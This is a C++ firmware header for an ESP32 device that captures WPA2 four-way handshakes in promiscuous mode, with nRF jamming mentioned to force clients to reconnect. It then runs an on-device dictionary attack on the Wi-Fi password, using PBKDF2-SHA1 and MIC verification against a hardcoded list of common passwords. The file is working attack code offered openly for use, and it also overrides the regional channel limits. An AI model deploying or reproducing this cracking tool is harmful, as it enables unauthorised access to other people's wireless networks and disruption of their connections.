#pragma once
// ############################################################################
//  gg_crack.h  -  KODI NRF24  /  WPA2 handshake capture + dictionary crack
//
//  Captures the WPA2 4-way EAPOL handshake in promiscuous mode, optionally
//  using nRF jamming to force client reconnections. Then runs a PBKDF2-SHA1
//  dictionary attack on-device using the ESP32 hardware SHA accelerator.
//
//  Flow:  scan → pick target → capture handshake → dictionary crack → result
//
//  Gated by GG_ENABLE_CRACK in gh_config.h (default ON).
//
//  Proven techniques only:
//    * esp_wifi_set_promiscuous()  — documented ESP-IDF API
//    * EAPOL 802.1X framing       — IEEE 802.11i-2004 section 8.5.2
//    * PBKDF2-SHA1 (4096 iter)    — IEEE 802.11i key derivation
//    * PRF-384 via HMAC-SHA1      — IEEE 802.11i PTK expansion
//    * mbedtls HMAC/SHA1          — ESP-IDF hardware-accelerated
// ############################################################################

#include <Arduino.h>
#include "gh_config.h"

#if GG_ENABLE_CRACK

#include <WiFi.h>
#include "esp_wifi.h"
#include "mbedtls/md.h"

// ===== Handshake state ======================================================
struct GgHandshake {
  uint8_t  bssid[6];
  uint8_t  sta[6];
  uint8_t  anonce[32];
  uint8_t  snonce[32];
  uint8_t  mic[16];
  uint8_t  eapol[300];
  uint16_t eapolLen;
  uint8_t  keyVer;
  bool     gotMsg1;
  bool     gotMsg2;
};

static GgHandshake ggHs;
static volatile bool     ggHsCaptured  = false;
static volatile uint32_t ggHsDataPkts  = 0;
static volatile uint32_t ggHsEapolPkts = 0;
static uint8_t  ggHsTargetBssid[6];
static uint8_t  ggHsTargetCh    = 0;
static char     ggHsTargetSsid[33] = "";
static bool     ggHsListening   = false;

// ===== Crack state ==========================================================
static TaskHandle_t ggCrackTask = nullptr;
static volatile uint32_t ggCrackTried  = 0;
static volatile bool     ggCrackFound  = false;
static volatile bool     ggCrackDone   = false;
static char              ggCrackPass[65] = "";

// ===== Dictionary ===========================================================
static const char* const GG_CRACK_DICT[] = {
  "12345678","password","123456789","1234567890","qwerty123",
  "password1","iloveyou","00000000","11111111","12341234",
  "88888888","66666666","qwertyui","abcdefgh","abc12345",
  "trustno1","sunshine1","princess1","football1","superman1",
  "password123","iloveyou1","internet","computer","welcome1",
  "master12","dragon12","monkey12","shadow12","michael1",
  "baseball1","letmein1","access14","mustang1","696969696",
  "charlie1","1234abcd","abcd1234","qwer1234","asdf1234",
  "zxcv1234","pass1234","1q2w3e4r","q1w2e3r4","1qaz2wsx",
  "zaq1xsw2","1234qwer","qwerty12","asdfghjk","zxcvbnm1",
  "passw0rd","p@ssw0rd","p@ssword","changeme","administrator",
  "whatever","starwars","testtest","trustme1","jennifer",
  "samantha","nicholas","alexandra","victoria","elizabeth",
  "benjamin","christop","danielle","midnight","darkness",
  "password12","password2","passwords","password!",
  "12345678a","123456abc","1234567a","987654321",
  "11223344","12121212","10101010","55555555","22222222",
  "33333333","44444444","77777777","99999999","13131313",
  "123123123","321321321","112233445","147258369","159357159",
  "homenetwork","wifipassword","mypassword","mysecret1",
  "network123","wireless","wifipass","wifipass1","wifi1234",
  "netgear1","linksys1","dlink1234","default1","admin1234",
  "internet1","security","security1","connect1","broadband",
  "spectrum1","comcast1","att12345","verizon1","tmobile1",
  "xfinity1","frontier","household","mynetwork",
  "guest1234","homesweet","familynet","speednet","fastnet1",
  "keepout1","getout123","hackme123","nopassword","letmein12",
  "access123","enter1234","opensesame","backdoor1","secret12",
  "master123","hunter12","killer12","jordan23","soccer12",
  "baseball","football","basketball","softball","lacrosse",
  "swimming","marathon","corvette","mercedes","porsche1",
  "ferrari1","mustang12","camaro12","charger1",
  "newyork1","losangeles","chicago1","houston1","phoenix1",
  "godisgood","blessed1","faith1234","church12",
};
#define GG_CRACK_DICT_N (int)(sizeof(GG_CRACK_DICT)/sizeof(GG_CRACK_DICT[0]))

// ===== PBKDF2-SHA1 ==========================================================
static void ggPbkdf2Sha1(const uint8_t* pwd, int pwdLen,
                          const uint8_t* salt, int saltLen,
                          uint8_t* out) {
  const mbedtls_md_info_t* md = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
  uint8_t U[20], T[20];
  for (int b = 1; b <= 2; b++) {
    uint8_t sb[68];
    memcpy(sb, salt, saltLen);
    sb[saltLen]   = 0;
    sb[saltLen+1] = 0;
    sb[saltLen+2] = 0;
    sb[saltLen+3] = (uint8_t)b;
    mbedtls_md_hmac(md, pwd, pwdLen, sb, saltLen + 4, U);
    memcpy(T, U, 20);
    for (int i = 1; i < 4096; i++) {
      mbedtls_md_hmac(md, pwd, pwdLen, U, 20, U);
      for (int j = 0; j < 20; j++) T[j] ^= U[j];
    }
    int off = (b - 1) * 20;
    int cpLen = 32 - off;
    if (cpLen > 20) cpLen = 20;
    memcpy(out + off, T, cpLen);
  }
}

// ===== PRF-384 (PTK derivation) =============================================
static void ggWpaPrf384(const uint8_t* pmk,
                         const uint8_t* aa, const uint8_t* spa,
                         const uint8_t* anonce, const uint8_t* snonce,
                         uint8_t* ptk) {
  const mbedtls_md_info_t* md = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
  uint8_t data[76];
  if (memcmp(aa, spa, 6) < 0) {
    memcpy(data, aa, 6); memcpy(data + 6, spa, 6);
  } else {
    memcpy(data, spa, 6); memcpy(data + 6, aa, 6);
  }
  if (memcmp(anonce, snonce, 32) < 0) {
    memcpy(data + 12, anonce, 32); memcpy(data + 44, snonce, 32);
  } else {
    memcpy(data + 12, snonce, 32); memcpy(data + 44, anonce, 32);
  }
  const char* label = "Pairwise key expansion";
  for (int i = 0; i < 3; i++) {
    uint8_t input[100];
    memcpy(input, label, 22);
    input[22] = 0x00;
    memcpy(input + 23, data, 76);
    input[99] = (uint8_t)i;
    uint8_t hmacOut[20];
    mbedtls_md_hmac(md, pmk, 32, input, 100, hmacOut);
    int cpLen = 48 - i * 20;
    if (cpLen > 20) cpLen = 20;
    memcpy(ptk + i * 20, hmacOut, cpLen);
  }
}

// ===== MIC verification =====================================================
static bool ggVerifyMic(const uint8_t* kck,
                         const uint8_t* eapolFrame, int eapolLen,
                         const uint8_t* capturedMic, uint8_t keyVer) {
  if (eapolLen < 99 || eapolLen > 300) return false;
  uint8_t buf[300];
  memcpy(buf, eapolFrame, eapolLen);
  memset(buf + 81, 0, 16);
  uint8_t calcMic[20];
  const mbedtls_md_info_t* md;
  if (keyVer == 1)
    md = mbedtls_md_info_from_type(MBEDTLS_MD_MD5);
  else
    md = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
  mbedtls_md_hmac(md, kck, 16, buf, eapolLen, calcMic);
  return memcmp(calcMic, capturedMic, 16) == 0;
}

// ===== Promiscuous callback (EAPOL capture) =================================
static void ggCrackSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA) return;
  if (ggHsCaptured) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* f = pkt->payload;
  int pktLen = pkt->rx_ctrl.sig_len;
  if (pktLen < 36) return;
  ggHsDataPkts++;

  uint8_t fcType = (f[0] >> 2) & 0x03;
  if (fcType != 2) return;
  uint8_t fcSubtype = (f[0] >> 4) & 0x0F;
  bool isQoS = (fcSubtype & 0x08) != 0;
  bool hasHtc = isQoS && ((f[1] & 0x80) != 0);
  int hdrLen = 24 + (isQoS ? 2 : 0) + (hasHtc ? 4 : 0);
  if (f[1] & 0x40) return; // protected frame — skip encrypted data

  int llcOff = hdrLen;
  if (llcOff + 8 > pktLen) return;
  if (f[llcOff] != 0xAA || f[llcOff+1] != 0xAA || f[llcOff+2] != 0x03) return;
  if (f[llcOff+6] != 0x88 || f[llcOff+7] != 0x8E) return;

  int eapolOff = llcOff + 8;
  if (eapolOff + 99 > pktLen) return;
  if (f[eapolOff + 1] != 0x03) return; // not EAPOL-Key

  uint16_t eapolBodyLen = ((uint16_t)f[eapolOff+2] << 8) | f[eapolOff+3];
  int eapolTotalLen = 4 + eapolBodyLen;
  if (eapolOff + eapolTotalLen > pktLen) return;
  if (eapolTotalLen > 300) return;

  ggHsEapolPkts++;

  uint16_t keyInfo = ((uint16_t)f[eapolOff+5] << 8) | f[eapolOff+6];
  uint8_t keyVer  = keyInfo & 0x07;
  bool pairwise   = (keyInfo & 0x0008) != 0;
  bool ack        = (keyInfo & 0x0080) != 0;
  bool mic        = (keyInfo & 0x0100) != 0;
  if (!pairwise) return;

  // extract BSSID and STA from 802.11 header
  uint8_t toDS   = f[1] & 0x01;
  uint8_t fromDS = (f[1] >> 1) & 0x01;
  uint8_t* bssid;
  uint8_t* sta;
  if (fromDS && !toDS) {      // AP → STA
    bssid = &f[10]; sta = &f[4];
  } else if (toDS && !fromDS) { // STA → AP
    bssid = &f[4]; sta = &f[10];
  } else return;

  if (memcmp(bssid, ggHsTargetBssid, 6) != 0) return;

  if (ack && !mic) {
    // Message 1: contains ANonce
    memcpy(ggHs.bssid, bssid, 6);
    memcpy(ggHs.sta, sta, 6);
    memcpy(ggHs.anonce, &f[eapolOff + 17], 32);
    ggHs.keyVer = keyVer;
    ggHs.gotMsg1 = true;
  }
  else if (!ack && mic && ggHs.gotMsg1) {
    // Message 2: contains SNonce + MIC
    if (memcmp(sta, ggHs.sta, 6) != 0) return;
    memcpy(ggHs.snonce, &f[eapolOff + 17], 32);
    memcpy(ggHs.mic, &f[eapolOff + 81], 16);
    memcpy(ggHs.eapol, &f[eapolOff], eapolTotalLen);
    ggHs.eapolLen = (uint16_t)eapolTotalLen;
    ggHs.gotMsg2 = true;
    ggHsCaptured = true;
  }
}

// ===== Capture control ======================================================
static inline void ggCrackCaptureBegin(uint8_t wifiCh) {
  memset(&ggHs, 0, sizeof(ggHs));
  ggHsCaptured = false;
  ggHsDataPkts = 0;
  ggHsEapolPkts = 0;
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(50);
  wifi_country_t cty = { "XX", 1, 14, 78, WIFI_COUNTRY_POLICY_MANUAL };
  esp_wifi_set_country(&cty);
  esp_wifi_set_channel(wifiCh, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(ggCrackSniffCb);
  esp_wifi_set_promiscuous(true);
  ggHsListening = true;
}

static inline void ggCrackCaptureEnd() {
  if (ggHsListening) {
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    ggHsListening = false;
  }
}

// ===== Crack task (runs on core 0) ==========================================
static void ggCrackTaskFn(void*) {
  uint8_t pmk[32], ptk[48];
  for (int i = 0; i < GG_CRACK_DICT_N; i++) {
    if (ggCrackDone) break;
    const char* pwd = GG_CRACK_DICT[i];
    int pwdLen = strlen(pwd);
    if (pwdLen < 8 || pwdLen > 63) { ggCrackTried++; continue; }
    ggPbkdf2Sha1((const uint8_t*)pwd, pwdLen,
                  (const uint8_t*)ggHsTargetSsid, strlen(ggHsTargetSsid), pmk);
    ggWpaPrf384(pmk, ggHs.bssid, ggHs.sta,
                ggHs.anonce, ggHs.snonce, ptk);
    if (ggVerifyMic(ptk, ggHs.eapol, ggHs.eapolLen,
                    ggHs.mic, ggHs.keyVer)) {
      strncpy(ggCrackPass, pwd, 64);
      ggCrackPass[64] = '\0';
      ggCrackFound = true;
      ggCrackDone = true;
      while (true) vTaskDelay(portMAX_DELAY);
      return;
    }
    ggCrackTried++;
    vTaskDelay(1);
  }
  ggCrackDone = true;
  while (true) vTaskDelay(portMAX_DELAY);
}

static inline void ggCrackEnd();
static inline void ggCrackBegin() {
  if (ggCrackTask) ggCrackEnd();
  ggCrackTried = 0;
  ggCrackFound = false;
  ggCrackDone = false;
  ggCrackPass[0] = '\0';
  xTaskCreatePinnedToCore(ggCrackTaskFn, "crack", 8192, NULL, 1, &ggCrackTask, 0);
}

static inline void ggCrackEnd() {
  ggCrackDone = true;
  if (ggCrackTask) {
    delay(50);
    TaskHandle_t h = ggCrackTask;
    if (h) { ggCrackTask = nullptr; vTaskDelete(h); }
  }
}

#else // !GG_ENABLE_CRACK — stubs so cleanup code compiles

static inline void ggCrackCaptureEnd() {}
static inline void ggCrackEnd() {}

#endif // GG_ENABLE_CRACK
